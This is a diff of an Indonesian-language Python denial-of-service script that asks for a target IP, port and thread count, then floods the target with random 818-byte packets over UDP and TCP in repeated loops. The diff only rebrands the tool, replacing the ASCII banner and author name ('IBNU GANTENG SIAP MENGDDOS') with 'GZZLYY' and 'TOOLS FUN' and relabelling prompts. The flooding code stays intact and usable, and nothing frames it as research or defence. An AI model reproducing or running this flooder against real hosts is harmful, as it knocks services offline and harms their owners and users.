@@ -7,29 +7,23 @@ import time
 os.system("clear")
 time.sleep(2)
 print('''\033[1;31;40m
-░░░░░██╗███╗░░██╗████████╗
-░░░░░██║████╗░██║╚══██╔══╝
-░░░░░██║██╔██╗██║░░░██║░░░
-██╗░░██║██║╚████║░░░██║░░░
-╚█████╔╝██║░╚███║░░░██║░░░
-░╚════╝░╚═╝░░╚══╝░░░╚═╝░░░
 
-███████╗██╗░░██╗██████╗░██████╗░███████╗░██████╗
-██╔════╝╚██╗██╔╝██╔══██╗██╔══██╗██╔════╝██╔════╝
-█████╗░░░╚███╔╝░██████╔╝██████╔╝█████╗░░╚█████╗░
-██╔══╝░░░██╔██╗░██╔═══╝░██╔══██╗██╔══╝░░░╚═══██╗
-███████╗██╔╝╚██╗██║░░░░░██║░░██║███████╗██████╔╝
-╚══════╝╚═╝░░╚═╝╚═╝░░░░░╚═╝░░╚═╝╚══════╝╚═════╝░''')
+░██████╗░███████╗███████╗██╗░░░░░██╗░░░██╗██╗░░░██╗
+██╔════╝░╚════██║╚════██║██║░░░░░╚██╗░██╔╝╚██╗░██╔╝
+██║░░██╗░░░███╔═╝░░███╔═╝██║░░░░░░╚████╔╝░░╚████╔╝░
+██║░░╚██╗██╔══╝░░██╔══╝░░██║░░░░░░░╚██╔╝░░░░╚██╔╝░░
+╚██████╔╝███████╗███████╗███████╗░░░██║░░░░░░██║░░░
+░╚═════╝░╚══════╝╚══════╝╚══════╝░░░╚═╝░░░░░░╚═╝░░░''')
 print("\033[94m")
 print("••••••••••••••••••••••••")
-print("IBNU GANTENG SIAP MENGDDOS")
-print("Ibnu Ganteng.. Bissmilah Tembus")
+print("TOOLS FUN")
+print("SEMOGA TEMBUS!")
 print("••••••••••••••••••••••••")
 ip = str(input("IP TARGET:"))
 port = int(input("PORT TARGET:"))
 choice = str(input("GAS ATTACK(y/n):"))
-times = int(input("PAKET J&T:"))
-threads = int(input(" ONGKOS KURIR:"))
+times = int(input("THREADS:"))
+threads = int(input(" PACKET:"))
 
 os.system("clear")
 def run():
@@ -41,9 +35,9 @@ def run():
                         addr = (str(ip),int(port))
                         for x in range(times):
                                 s.sendto(data,addr)
-                        print(i +" PACKET DARI IBNU GANTENG HAHAY..")
+                        print(i +" PACKET DARI GZZLYY HAHAY..")
                 except:
-                        print("[X] PACKET DARI IBNU GANTENG HAHAY..")
+                        print("[X] PACKET DARI GZZLYY HAHAY..")
 
 def run2():
         data = random._urandom(818)
@@ -55,10 +49,10 @@ def run2():
                         s.send(data)
                         for x in range(times):
                                 s.send(data)
-                        print(i +" PACKET DARI IBNU GANTENG HAHAY..")
+                        print(i +" PACKET DARI GZZLYY HAHAY..")
                 except:
                         s.close()
-                        print("[X] PACKET DARI IBNU GANTENG HAHAY..")
+                        print("[X] PACKET DARI GZZLYY HAHAY..")
 
 def run3():
         data = random._urandom(818)
@@ -70,10 +64,10 @@ def run3():
                         s.send(data)
                         for x in range(times):
                                 s.send(data)
-                        print(i +" PACKET DARI IBNU GANTENG HAHAY..")
+                        print(i +" PACKET DARI GZZLYY HAHAY..")
                 except:
                         s.close()
-                        print("[X] PACKET DARI IBNU GANTENG HAHAY..")
+                        print("[X] PACKET DARI GZZLYY HAHAY..")
 
 for y in range(threads):
         if choice == 'y':
